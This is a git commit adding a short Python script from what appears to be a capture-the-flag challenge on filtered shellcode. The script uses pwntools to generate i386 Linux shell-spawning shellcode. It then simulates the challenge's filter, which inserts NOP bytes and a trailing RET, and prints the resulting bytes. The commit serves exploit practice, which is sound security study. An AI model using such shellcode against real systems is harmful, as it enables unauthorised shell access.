a9b8b2961cccff772084b507f6ba7f9c3e0d5a7a
Oleg Lazari <lazarioleg97@gmail.com>
2025-09-19 21:38:51 -0400

    added execute extrapolation

---
+++ filtered-shellcode-hard-u/python-execute.py
@@ -0,0 +1,43 @@
+from pwn import *
+
+def execute(input_array: bytes, char_count: int) -> bytes:
+    import sys
+    
+    if input_array is None or char_count == 0:
+        sys.exit(1)
+    
+    double_char_count = char_count * 2
+    aligned_buffer = bytearray(double_char_count + 1)  # +1 for 0xc3
+    
+    incremented_non_checked = 0
+    
+    for i in range(double_char_count):
+        # val_high = 0, val_low = i
+        # high_bits = 0
+        # condition: ((i & 3) > 1)
+        if (i & 3) > 1:
+            aligned_buffer[i] = 0x90  # NOP
+        else:
+            if incremented_non_checked < char_count:
+                aligned_buffer[i] = input_array[incremented_non_checked]
+                incremented_non_checked += 1
+            else:
+                aligned_buffer[i] = 0x00  # pad with zeros if input exhausted
+    
+    aligned_buffer[double_char_count] = 0xc3  # RET
+    
+    return bytes(aligned_buffer)
+
+def main():
+    our_input = asm(shellcraft.i386.linux.sh())
+    our_input_len = len(our_input)
+
+    output = execute(our_input, our_input_len)
+    hex_output = ' '.join(f'{b:02x}' for b in output)
+    print(hex_output)
+    original_output = ' '.join(f'{b:02x}' for b in our_input)
+    print(our_input)
+
+
+if __name__ == "__main__":
+    main()
